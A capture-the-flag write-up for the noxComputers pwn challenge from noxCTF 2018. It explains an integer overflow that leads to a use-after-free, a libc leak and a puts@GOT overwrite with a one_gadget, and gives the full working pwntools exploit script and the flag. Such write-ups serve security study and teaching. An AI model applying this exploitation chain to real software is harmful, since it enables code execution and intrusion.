# noxComputers - pwn challenge - noxCTF 2018

## The Challenge

The challenge is basically a computers store service- the user can buy premium user (or multiple users and be eligible for a future discount), buy a computer, return a computer, and show/edit the account details.

## The Vulnerability

The vulnerability exists in `buy_multiple_premium_users()`, in the following functionality

```C
void buy_multiple_premium_users()
{
    ...
    ...
    if((unsigned short)(user_count + premiums_amount) > ARRAY_MAX) 
    {
        puts_wrapper("You can't create more than 1024 users :(");
        return;
    }
    ...
}
```

The problem is the fact that `user_count + premiums_count` (where `premiums_count` is controlled by the user) can overflow- this allows storing `user` struct pointers past the `users` global array.

This bug, along with the fact that *even* after choosing the `premiums_count`, the user can still stop adding users at any point in `buy_multiple_premium_users()`, allowing us to stop whenever we want, and to change the global `user_count` variable to any value we would like, and thus, access any index up to `65535` from the `users` array as a `user` struct.

## The Exploit

The exploit consists of a few parts, and they can be broken down to the following points:

1) Allocate a `user` struct, and buy a computer for that user.

2) Allocate more users using the `buy_multiple_premium_users()` function, to prepare the `user_count` global variable to the integer overflow.

3) Allocate a lot of users using `buy_multiple_premium_users()` again, and make it stop after it overwrites a pointer that overlaps with the first `computer` pointer inside the `computers_array` global variable.

4) Edit the details of the last `user` (the one that overlaps with a computer inside `computers_array`), such that the `money` member of that user will be 0 - the `money` member of the `user` struct, and the `owners` member of the `computer` struct overlap, and by getting a computer to have 0 owners- we can also get it to be free'd later on!

5) Trigger `free()` on the overlapping `user`/`computer` struct, this is done by calling `return_computer()` with an invalid computer name (this way don't actually remove the computer from any user's linked-list, because if we had to, we would've crashed due to the way `unlink_computer()` works).

6) Allocate a new user using `buy_multiple_premium_users()` - we cannot simply use `buy_premium_user()` because there's a validation for the `user_count`, and even when we use the `buy_multiple_premium_users()` we have to specify the `premiums_count` in such a way that we overflow the same check again, otherwise we can not bypass the overflow check.
    - That allocation has to be allocated very carefully - if we are careful enough, we can get the FREED `user` struct to overlap with the new allocation's `name` member, this allows us a complete control over the old free'd `user` struct which we can still access!

7) After getting the `name` member of the new `user` to overlap with the WHOLE free'd `user` struct, if we specify the name of the new `user` struct to be a GOT entry address, when we call `show_account_details()` for the free'd `user` we can leak a libc address, and when we call `edit_account_details()` we can edit a GOT entry - and since we already have a libc-leak, we can just overwrite `puts@GOT` with a one gadget address (luckily, when calling `puts()`, the `rax == NULL` is met, and we can use one of the gadgets retrieved by [one_gadget](https://github.com/david942j/one_gadget)) 

8) Profit =)

## The Leak

As already mentioned in the previous section, the leak is possible when we simply overlap a `user` struct with a `name` member of another `user` struct, since we can edit the `name` member, we have full control over the struct, allowing us to edit IT'S `name` member, and to print a value from anywhere we want by triggering `show_account_details()`.

## Flow Hijacking

Again- as already mentioned, the flow hijacking is possible when we simply overlap a `user` struct with a `name` member of another `user` struct, and since we can edit the `name` member, we have full control over the struct, allowing us to edit IT'S `name` member, and to write any value to anywhere we want by simply triggering `edit_account_details()`.

## Exploit Code

The flag is: `noxCTF{0ne_int3ger_0v3rflow_t0_rule_th3m_4ll}`

```Python
from pwn import *

r = process("./noxComputers")

def menu():
	r.recvuntil('choice: ')

def buy_premium(name, money):
	menu()
	r.sendline('1')
	r.sendlineafter('username: ', name)
	r.sendlineafter('account: ', str(money))

def buy_multiple_premiums(amount, actual_amount, name_list, money_list):
	menu()
	r.sendline('2')
	r.sendlineafter('buy: ', str(amount))
	r.recvline()
	for i in xrange(actual_amount):
		r.sendafter('Y: ', 'x')
		r.send('')
		r.sendlineafter(': ', name_list[i])
		r.sendlineafter('user: ', str(money_list[i]))
		r.recvline()
	
	if amount != actual_amount:
		r.sendlineafter('Y: ', 'Y')
	r.recvline()

def buy_computer(user_id, computer_name, manu_name, super_fast, price, would_buy):
	menu()
	r.sendline('3')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('computer name: ', computer_name)
	r.sendlineafter('manufacturer name: ', manu_name)
	r.sendlineafter('(Y/N): ', super_fast)
	r.sendlineafter('pay: ', str(price))
	r.sendlineafter('(Y/N): ', would_buy)

def buy_computer_exists(user_id, computer_name, would_buy):
	menu()
	r.sendline('3')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('computer name: ', computer_name)
	r.sendlineafter('(Y/N): ', would_buy)

def show_details(user_id):
	menu()
	r.sendline('4')
	r.sendlineafter('id: ', str(user_id))
	r.recvuntil('Username: ')
	username = r.recvline().replace('\n','')
	r.recvuntil('money: ')
	money = int(r.recvline().replace('\n',''))
	return (username, money)

def edit_details(user_id, new_name, new_money):
	menu()
	r.sendline('5')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('username: ', new_name)
	r.sendlineafter('account: ', str(new_money))

def return_computer(user_id, computer_name):
	menu()
	r.sendline('6')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('name: ', computer_name)

def exit_program():
	menu()
	r.sendline('7')


if __name__ == "__main__":
	'''
	--------------------------------------------------------
					Exploit process:
	--------------------------------------------------------
		
		1) Add enough premium accounts.
		2) Call 'buy_multiple_premiums' again to cause an overflow.
		3) Overlap the overflow with an IN-USE (computer_bitmaps[i] == 1) computer, and edit it's money such that the money of the overlapping account will be 0.
		4) Return a computer which you don't own --> free's the overlapping user that exists in the `computers_array` due to the overflow.
		5) We can still access that user from the `users` array- we can still access it's name.
		6) Allocate a new user, due to the order of free/alloc, the user struct will overlap with the old FREED `name` field.
		7) This allows us to change the fields of the new user, using the old free'd user struct!
		8) Classic UAF primitive from here since we can edit the user settings.
		9) Partially overwrite a GOT entry using `edit_details()`
	   10) Profit :)

	'''

	libc = ELF('./libc-2.23.so')
	print ''

	# --------------------- Step 0 ----------------------------
	# Add a computer that will overlap with the overflowed user
	# ---------------------------------------------------------

	buy_premium('user0', 100)
	buy_computer(0, 'computer0', 'manufacturer0', 'Y', 100, 'Y') # to get computers_bitmap[i] != 0

	# ----------- Step 1 -----------
	#   Add enough Premium Users
	# ------------------------------
	amount = 100
	name_list = [str(num+1) for num in xrange(amount)]
	money_list = [100]*amount
	buy_multiple_premiums(amount, amount, name_list, money_list)

	# ----------- Step 2 -----------
	#   Cause Integer Overflow
	# ------------------------------
	actual_amount = 1060 # This causes an overflow and changes `user_count` to 1152 (==1024+128), which is the index to the first computer in `computers_array`
	name_list = [str(100+num+1) for num in xrange(actual_amount)]
	money_list = [100]*actual_amount
	amount = 65535
	buy_multiple_premiums(amount, actual_amount, name_list, money_list) # overflow and fake a computer
	
	# ------------------------- Step 3 ------------------------------------
	#   Edit the `money` member of the overlapping user to be 0,
	#   This will change the `owners` member of the computer to be 0.
	# 	And this allows freeing the `user` when calling `return_computer`
	# ---------------------------------------------------------------------
	edit_details(1152, 'pwn', 0) # edit the user to change the `owners` member of the fake computer to be 0
	return_computer(1, 'fake') # trigger free() on forged computer
	
	# --------------------------- Step 4 ---------------------------------------
	#   Allocate a new user.
	#   The `name` member will overlap with the WHOLE FREED `user struct`.
	#	So, we make the `name` of the new user to have the address of 
	#	A GOT entry, and therefore, the old `name` will point to the GOT.
	# 	(This is true because the `name` is the first element in `user struct`
	# --------------------------------------------------------------------------
	puts_got = 0x604028
	amount = 65536 - (1060+100+1)
	actual_amount = 1
	name_list = [p64(puts_got)]
	money_list = [100]
	
	# The old struct overlaps with the new string!
	# Therefore, puts@GOT will be where the old `char* name` of #1152 was!
	buy_multiple_premiums(amount, actual_amount, name_list, money_list) 	
	
	# -------------------------- Step 5 --------------------------------------
	# 	Print the details of the FREED user, and we'll leak a libc address,
	#	Change the details of the FREED user, and we'll overwrite the GOT!
	# ------------------------------------------------------------------------
	
	# -------------------- Libc Leak --------------------------
	# 	  We leak a `puts()` address, and then 
	#     we calculate the libc base and the address of
	#     the one gadget.
	# ---------------------------------------------------------

	username, money = show_details(1152)   # The name string of #1153 overlaps with the struct of #1152!
	libc_leak = u64(username.ljust(8,'\x00'))
	log.info("puts @ 0x%x\n" % libc_leak)
	
	libc_base = libc_leak - libc.symbols['puts']
	log.info("libc base @ 0x%x\n" % libc_base)

	one_gadget = libc_base + 0x45216
	log.info("one gadget @ 0x%x\n" % one_gadget)

	# -------------------- GOT overwrite ----------------------------
	# 	~ We overwrite puts@GOT with a one gadget address,
	#     because the constraint `rax == NULL` is met.
	# ---------------------------------------------------------------
	edit_details(1152, p64(one_gadget), 1) # Changes the `#1152->name` to be the one_gadget, but because THE WHOLE STRUCT overlapped with `#1153->name`, its actually changing puts@GOT!
	r.interactive()
```


